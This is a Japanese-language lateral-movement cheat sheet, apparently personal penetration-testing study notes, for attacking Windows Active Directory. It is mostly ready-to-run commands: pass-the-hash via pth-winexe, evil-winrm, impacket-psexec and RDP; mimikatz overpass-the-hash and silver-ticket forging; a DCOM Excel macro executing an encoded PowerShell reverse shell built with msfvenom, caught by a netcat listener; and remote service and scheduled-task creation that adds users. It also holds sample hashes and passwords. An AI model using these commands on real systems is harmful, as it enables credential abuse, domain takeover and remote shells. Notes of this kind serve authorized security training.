## Pass the Hash

#### pth-winexe(kaliから横展開)

```bash
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //192.168.151.1 cmd
```

### evil-winrm

- **Ports:** 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships:** Remote Management Users

```bash
evil-winrm -i 192.168.158.57 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 
```

### impacket-psexec

```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5 Administrator@192.168.158.57
```

### RDP

```
xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
```

```
rdesktop -g 90% -d EXAM -u ted -p avatar123 192.168.131.171
```



## Overthehash

mimikatzでover the hashする

```cmd
sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:2892d26cdf84d7a70e2eb3b9f05c425e /run:PowerShell.exe
```

Kerberosチケットを確認する

```powershell
PS C:\Windows\system32> klist
Current LogonId is 0:0x186536
Cached Tickets: (0)
```

ドメインコントローラ上のネットワーク共有に接続してTGTを生成する

```
net use \\dc01
klist
```

TGTとTGSが登録される

PsExecで横展開する

```powershell
PsExec.exe \\dc01 cmd.exe
```


※Over the HashもAdmin$という特別な管理者共有へのアクセスが必要なため、ターゲットマシンのローカル管理者権限が必要となる



## Pass the Ticket

#### サービスアカウントのパスワードハッシュの取得

シルバーチケットに必要となる。kerberousでiis_serverのパスワードは取得済の前提

```cmd
kerberos::hash /user:iis_service /domain:corp.com /password:Qwerty09!

----
mimikatz # kerberos::hash /user:iis_service /domain:corp.com /password:Qwerty09!
        * rc4_hmac_nt       e2b475c11da2a0748290d87aa966c327
        * aes128_hmac       7eabd29e56e7e8a31b1c180b88e7b801
        * aes256_hmac 
```

#### シルバーチケットの取得

```cmd
# チケットを一度削除
kerberos::purge
kerberos::list

kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-4038953314-3014849035-1274281563 /target:CorpWebServer.corp.com /service:HTTP /rc4:e2b475c11da2a0748290d87aa966c327 /ptt
```

* `kerberos::golden`：名前がゴールドだがシルバー
* /sid：ユーザのSID
* /target：サービスの完全修飾ホスト名
* /service：サービスタイプ
* /rc4：is_serviceサービスアカウントのパスワードハッシュ



### DCOM(Distributed Component Object Model)

ネットワーク上の複数のコンピュータ間の相互作用のためにDCOM（Distributed Component Object Model）へと拡張

 DCOM とのやりとりは、TCP 135 番ポートの RPC で行われる

API である DCOM サービスコントロールマネージャを呼び出すには、ローカル管理者のアクセス権が必要

* オブジェクトのインスタンスを作成

  ```powershell
  $com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "172.16.129.5"))
  
  $com | Get-Member
  ```

* RUNメソッドがあることを確認する

  ![image-20230113084001174](img/ActiveDirectory_lateralmove/image-20230113084001174.png)

* Excelでマクロを作成する

  ```vbscript
  Sub mymacro()
      Shell ("notepad.exe")
  End Sub
  ```

* プロファイルの要件を満たすデスクトップフォルダを作成

  ```powershell
  $Path = "\\172.16.135.5\c$\Windows\sysWOW64\config\systemprofile\Desktop"
  
  $temp = [system.io.directory]::createDirectory($Path)
  ```

* リモートにexcelファイルをコピーし実行する

  ```powershell
  $com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "172.16.135.5"))
  
  $LocalPath = "C:\Users\jeff_admin\myexcel.xls"
  
  $RemotePath = "\\172.16.135.5\c$\myexcel.xls"
  
  [System.IO.File]::Copy($LocalPath, $RemotePath, $True)
  
  $temp = [system.io.directory]::createDirectory($Path)
  
  $Workbook = $com.Workbooks.Open("C:\myexcel.xls")
  
  $com.Run("mymacro")
  ```

* リバースシェル版でマクロを再作成する

  ```
  msfvenom -p windows/shell_reverse_tcp LHOST=172.16.135.10 LPORT=4444 -f hta-psh -o evil.hta
  ```

  pythonで文字列分割する(python.mdを参照)

  ```
  Sub mymacro()
      
      Dim Str As String
      Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
      Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
      Str = Str + "kAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnA"
      Str = Str + "H0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGk"
      Str = Str + "AcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8Ad"
   
      Str = Str + "HQAeQBsAGUAPQAnAEgAaQBkAGQAZQBuACcAOwAkAHMALgBDAHI"
      Str = Str + "AZQBhAHQAZQBOAG8AVwBpAG4AZABvAHcAPQAkAHQAcgB1AGUAO"
      Str = Str + "wAkAHAAPQBbAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB"
      Str = Str + "0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBdADoAOgBTAHQAYQByA"
      Str = Str + "HQAKAAkAHMAKQA7AA=="
      
      Shell (Str)
  End Sub
  ```

* ネットキャットで待機し、リモートにファイルコピーして改めてマクロを実行する

  ```cmd
  PS C:\Tools\practical_tools> nc.exe -lvnp 4444
  ```




### パスワードでの横展開（windows clientから）

### RDP(port 3389)

```cmd
rdesktop -g 90% -d xor.com -u daisy -p XorPasswordIsDead17 10.11.1.122
```



#### PsExec

* Ports: 445/TCP(SMB)
* Required Group Memberships：Administrators

![image-20230118224129844](C:\Users\nflabs-03\AppData\Roaming\Typora\typora-user-images\image-20230118224129844.png)



#### Remote Process Creation Using WinRM

- **Ports:** 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships:** Remote Management Users

```
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
```

Powershellでも同様のことができるが、新しいPSCredential Objectを作成する必要がある

```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

以下コマンドでPSSessionを作成する

```powershell
Enter-PSSession -Computername TARGET -Credential $credential
```

スクリプトを実行するための以下のようなコマンドもある

```powershell
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```



#### Remotely Creating Services Using sc

- Ports:
  - 135/TCP, 49152-65535/TCP (DCE/RPC)
  - 445/TCP (RPC over SMB Named Pipes)
  - 139/TCP (RPC over SMB Named Pipes) SMB over NetBIOS
- **Required Group Memberships:** Administrators

SVCCTL：Service Control Manager
EPM：Endpoint Mapper

1. port135のEPMにつなぐ、EPMがSVCCTLにアクセスするためのIPアドレスとポート番号を通知する。このポートには通常49152-65535のダイナミックポートが使われる。

   ![image-20221119100519157](img/ActiveDirectory_lateralmove/image-20221119100519157.png)

2. もしRPCでの接続が失敗したらSMBパイプで接続を試みる(port 445 / port139)

![image-20221119100646375](img/ActiveDirectory_lateralmove/image-20221119100646375.png)

`THMservice`を作って実行するコマンド

```cmd
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
```

"net user"コマンドがサービスがスタートすると実行され、新しいローカルユーザが作成される。
コマンド出力を確認することはできない。

サービスを止めて削除するコマンド

```cmd
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```



#### Creating Scheduled Tasks Remotely

schtasksを作成する。THMtask1を作成するコマンド

```cmd
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 

schtasks /s TARGET /run /TN "THMtask1" 
```

/sc ONCE：特定の時間に一回のみ実施する

これも標準出力結果を見ることはできない

削除するコマンド

```cmd
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```
